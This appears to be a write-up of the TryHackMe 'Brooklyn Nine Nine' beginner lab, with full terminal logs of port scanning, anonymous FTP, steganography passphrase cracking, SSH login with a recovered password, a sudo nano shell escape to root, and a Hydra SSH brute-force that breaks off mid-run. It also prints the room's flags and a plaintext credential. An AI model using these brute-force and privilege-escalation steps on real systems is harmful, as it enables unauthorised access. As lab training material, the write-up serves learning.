---
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.
---

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/95b2fab20e29a6d22d6191a789dcbe1f.jpeg)

 Deploy and get hacking

 Start Machine

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. If you find more dm me in discord at Fsociety2006.  

Answer the questions below

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 10.10.249.1 --ulimit 5500 -b 65535 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.249.1:22
Open 10.10.249.1:21
Open 10.10.249.1:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-28 17:55 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Initiating Ping Scan at 17:55
Scanning 10.10.249.1 [2 ports]
Completed Ping Scan at 17:55, 0.23s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 17:55
Completed Parallel DNS resolution of 1 host. at 17:55, 0.01s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 17:55
Scanning 10.10.249.1 [3 ports]
Discovered open port 22/tcp on 10.10.249.1
Discovered open port 21/tcp on 10.10.249.1
Discovered open port 80/tcp on 10.10.249.1
Completed Connect Scan at 17:55, 0.22s elapsed (3 total ports)
Initiating Service scan at 17:55
Scanning 3 services on 10.10.249.1
Completed Service scan at 17:55, 6.50s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.249.1.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:55
NSE: [ftp-bounce 10.10.249.1:21] PORT response: 500 Illegal PORT command.
Completed NSE at 17:55, 8.21s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 1.68s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Nmap scan report for 10.10.249.1
Host is up, received syn-ack (0.22s latency).
Scanned at 2022-12-28 17:55:08 EST for 17s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 167f2ffe0fba98777d6d3eb62572c6a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e3b61594bc429b5e858396f6fe99bee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab162e79203c9b0a019c8c4426015804 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 17:55
Completed NSE at 17:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.14 seconds


┌──(kali㉿kali)-[~]
└─$ ftp 10.10.249.1  
Connected to 10.10.249.1.
220 (vsFTPd 3.0.3)
Name (10.10.249.1:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40692|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||26912|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*****************************************************************|   119        1.93 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (0.42 KiB/s)
ftp> exit
221 Goodbye.
                                                                                                              
┌──(kali㉿kali)-[~]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

┌──(kali㉿kali)-[~/Downloads]
└─$ wget http://10.10.249.1/brooklyn99.jpg
--2022-12-28 18:22:59--  http://10.10.249.1/brooklyn99.jpg
Connecting to 10.10.249.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 69685 (68K) [image/jpeg]
Saving to: ‘brooklyn99.jpg’

brooklyn99.jpg              100%[=========================================>]  68.05K   164KB/s    in 0.4s    

2022-12-28 18:23:00 (164 KB/s) - ‘brooklyn99.jpg’ saved [69685/69685]

                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ file brooklyn99.jpg 
brooklyn99.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 533x300, components 3


┌──(kali㉿kali)-[~/Downloads]
└─$ exiftool brooklyn99.jpg                                         
ExifTool Version Number         : 12.52
File Name                       : brooklyn99.jpg
Directory                       : .
File Size                       : 70 kB
File Modification Date/Time     : 2020:05:26 05:01:39-04:00
File Access Date/Time           : 2022:12:28 18:23:03-05:00
File Inode Change Date/Time     : 2022:12:28 18:23:00-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 533
Image Height                    : 300
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 533x300
Megapixels                      : 0.160

┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf brooklyn99.jpg 
Enter passphrase: 
steghide: could not extract any data with that passphrase!

so using stegcracker

https://github.com/Paradoxis/StegCracker

┌──(kali㉿kali)-[~/Downloads]
└─$ stegcracker                        
Command 'stegcracker' not found, but can be installed with:
sudo apt install stegcracker
Do you want to install it? (N/y)y

┌──(kali㉿kali)-[~/Downloads]
└─$ stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
StegCracker 2.1.0 - (https://github.com/Paradoxis/StegCracker)
Copyright (c) 2022 - Luke Paris (Paradoxis)

StegCracker has been retired following the release of StegSeek, which 
will blast through the rockyou.txt wordlist within 1.9 second as opposed 
to StegCracker which takes ~5 hours.

StegSeek can be found at: https://github.com/RickdeJager/stegseek

Counting lines in wordlist..
Attacking file 'brooklyn99.jpg' with wordlist '/usr/share/wordlists/rockyou.txt'..
Successfully cracked file with password: admin
Tried 20523 passwords
Your file has been written to: brooklyn99.jpg.out
admin

┌──(kali㉿kali)-[~/Downloads]
└─$ steghide extract -sf brooklyn99.jpg                        
Enter passphrase: 
wrote extracted data to "note.txt".
                                                                                                              
┌──(kali㉿kali)-[~/Downloads]
└─$ cat note.txt           
Holts Password:
fluffydog12@ninenine

Enjoy!!

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

so the pass is form holt

┌──(kali㉿kali)-[~/Downloads]
└─$ ssh holt@10.10.249.1 
holt@10.10.249.1's password: fluffydog12@ninenine
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ whoami
holt
holt@brookly_nine_nine:~$ ls
nano.save  user.txt
holt@brookly_nine_nine:~$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee

privesc

holt@brookly_nine_nine:~$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root             31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root   root            167K Dec  1  2017 /bin/less
-rwsr-xr-x 1 root   root             43K Jan  8  2020 /bin/mount
-rwsr-xr-x 1 root   root             63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root   root             27K Jan  8  2020 /bin/umount
-rwsr-xr-x 1 root   root             40K Oct 10  2019 /snap/core/8268/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/8268/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/bin/su
-rwsr-xr-x 1 root   root             27K Oct 10  2019 /snap/core/8268/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/8268/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/8268/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/8268/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/8268/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/8268/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Oct 11  2019 /snap/core/8268/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Jun 10  2019 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/8268/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root   root            105K Dec  6  2019 /snap/core/8268/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Jun 12  2018 /snap/core/8268/usr/sbin/pppd
-rwsr-xr-x 1 root   root             40K Jan 27  2020 /snap/core/9066/bin/mount
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9066/bin/ping
-rwsr-xr-x 1 root   root             44K May  7  2014 /snap/core/9066/bin/ping6
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9066/bin/su
-rwsr-xr-x 1 root   root             27K Jan 27  2020 /snap/core/9066/bin/umount
-rwsr-xr-x 1 root   root             71K Mar 25  2019 /snap/core/9066/usr/bin/chfn
-rwsr-xr-x 1 root   root             40K Mar 25  2019 /snap/core/9066/usr/bin/chsh
-rwsr-xr-x 1 root   root             74K Mar 25  2019 /snap/core/9066/usr/bin/gpasswd
-rwsr-xr-x 1 root   root             39K Mar 25  2019 /snap/core/9066/usr/bin/newgrp
-rwsr-xr-x 1 root   root             53K Mar 25  2019 /snap/core/9066/usr/bin/passwd
-rwsr-xr-x 1 root   root            134K Jan 31  2020 /snap/core/9066/usr/bin/sudo
-rwsr-xr-- 1 root   systemd-resolve  42K Nov 29  2019 /snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root            419K Mar  4  2019 /snap/core/9066/usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root            109K Apr 10  2020 /snap/core/9066/usr/lib/snapd/snap-confine
-rwsr-xr-- 1 root   dip             386K Feb 11  2020 /snap/core/9066/usr/sbin/pppd
-rwsr-sr-x 1 daemon daemon           51K Feb 20  2018 /usr/bin/at
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root             44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root   root             75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root             40K Mar 22  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root             37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root             59K Mar 22  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root             22K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root            146K Jan 31  2020 /usr/bin/sudo
-rwsr-xr-x 1 root   root             19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-- 1 root   messagebus       42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root             10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root            427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root             14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root   root            107K Oct 30  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root             99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic

holt@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
holt@brookly_nine_nine:~$ sudo nano /root/root.txt


-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!

or

https://gtfobins.github.io/gtfobins/nano/

sudo nano
ctrl +R ctrl + X
reset; sh 1>&0 2>&0

# ls  
nano.save  user.txt
# cat nano.save

bash: line 1:  8199 Hangup                  sh 1>&0 2>&0
bash: /bin: Is a directory

# whoami
root


another way using hydra

┌──(kali㉿kali)-[~]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.249.1 ssh -V -t 64
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-28 18:43:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.249.1:22/
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "654321" - 17 of 14344399 [child 16] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "michael" - 18 of 14344399 [child 17] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "ashley" - 19 of 14344399 [child 18] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "qwerty" - 20 of 14344399 [child 19] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "111111" - 21 of 14344399 [child 20] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "iloveu" - 22 of 14344399 [child 21] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "000000" - 23 of 14344399 [child 22] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "michelle" - 24 of 14344399 [child 23] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "tigger" - 25 of 14344399 [child 24] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "sunshine" - 26 of 14344399 [child 25] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "chocolate" - 27 of 14344399 [child 26] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "password1" - 28 of 14344399 [child 27] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "soccer" - 29 of 14344399 [child 28] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "anthony" - 30 of 14344399 [child 29] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "friends" - 31 of 14344399 [child 30] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "butterfly" - 32 of 14344399 [child 31] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "purple" - 33 of 14344399 [child 32] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "angel" - 34 of 14344399 [child 33] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jordan" - 35 of 14344399 [child 34] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "liverpool" - 36 of 14344399 [child 35] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "justin" - 37 of 14344399 [child 36] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "loveme" - 38 of 14344399 [child 37] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "fuckyou" - 39 of 14344399 [child 38] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "123123" - 40 of 14344399 [child 39] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "football" - 41 of 14344399 [child 40] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "secret" - 42 of 14344399 [child 41] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "andrea" - 43 of 14344399 [child 42] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "carlos" - 44 of 14344399 [child 43] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jennifer" - 45 of 14344399 [child 44] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "joshua" - 46 of 14344399 [child 45] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "bubbles" - 47 of 14344399 [child 46] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "1234567890" - 48 of 14344399 [child 47] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "superman" - 49 of 14344399 [child 48] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "hannah" - 50 of 14344399 [child 49] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "amanda" - 51 of 14344399 [child 50] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "loveyou" - 52 of 14344399 [child 51] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "pretty" - 53 of 14344399 [child 52] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "basketball" - 54 of 14344399 [child 53] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "andrew" - 55 of 14344399 [child 54] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "angels" - 56 of 14344399 [child 55] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "tweety" - 57 of 14344399 [child 56] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "flower" - 58 of 14344399 [child 57] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "playboy" - 59 of 14344399 [child 58] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "hello" - 60 of 14344399 [child 59] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "elizabeth" - 61 of 14344399 [child 60] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "hottie" - 62 of 14344399 [child 61] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "tinkerbell" - 63 of 14344399 [child 62] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "charlie" - 64 of 14344399 [child 63] (0/0)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "samantha" - 65 of 14344422 [child 46] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "barbie" - 66 of 14344422 [child 38] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "chelsea" - 67 of 14344422 [child 49] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "lovers" - 68 of 14344422 [child 40] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "teamo" - 69 of 14344422 [child 51] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jasmine" - 70 of 14344422 [child 53] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "brandon" - 71 of 14344422 [child 60] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "666666" - 72 of 14344422 [child 46] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "shadow" - 73 of 14344422 [child 34] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "melissa" - 74 of 14344422 [child 50] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "eminem" - 75 of 14344422 [child 1] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "matthew" - 76 of 14344422 [child 2] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "robert" - 77 of 14344422 [child 11] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "danielle" - 78 of 14344422 [child 10] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "forever" - 79 of 14344422 [child 61] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "family" - 80 of 14344422 [child 37] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jonathan" - 81 of 14344422 [child 0] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "987654321" - 82 of 14344422 [child 27] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "computer" - 83 of 14344422 [child 28] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "whatever" - 84 of 14344422 [child 45] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "dragon" - 85 of 14344422 [child 62] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "vanessa" - 86 of 14344422 [child 4] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "cookie" - 87 of 14344422 [child 38] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "naruto" - 88 of 14344422 [child 42] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "summer" - 89 of 14344422 [child 44] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "sweety" - 90 of 14344422 [child 55] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "spongebob" - 91 of 14344422 [child 49] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "joseph" - 92 of 14344422 [child 40] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "junior" - 93 of 14344422 [child 7] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "softball" - 94 of 14344422 [child 12] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "taylor" - 95 of 14344422 [child 16] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "yellow" - 96 of 14344422 [child 25] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "daniela" - 97 of 14344422 [child 3] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "lauren" - 98 of 14344422 [child 9] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "mickey" - 99 of 14344422 [child 13] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "princesa" - 100 of 14344422 [child 19] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "alexandra" - 101 of 14344422 [child 22] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "alexis" - 102 of 14344422 [child 23] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "jesus" - 103 of 14344422 [child 26] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "estrella" - 104 of 14344422 [child 30] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "miguel" - 105 of 14344422 [child 41] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "william" - 106 of 14344422 [child 46] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "thomas" - 107 of 14344422 [child 47] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "beautiful" - 108 of 14344422 [child 51] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "mylove" - 109 of 14344422 [child 52] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "angela" - 110 of 14344422 [child 53] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "poohbear" - 111 of 14344422 [child 56] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "patrick" - 112 of 14344422 [child 57] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "iloveme" - 113 of 14344422 [child 60] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "sakura" - 114 of 14344422 [child 34] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "adrian" - 115 of 14344422 [child 50] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "alexander" - 116 of 14344422 [child 1] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "destiny" - 117 of 14344422 [child 2] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "christian" - 118 of 14344422 [child 11] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "121212" - 119 of 14344422 [child 61] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "sayang" - 120 of 14344422 [child 10] (0/23)
[ATTEMPT] target 10.10.249.1 - login "jake" - pass "america" - 121 of 14344422 [child 37] (0/23)
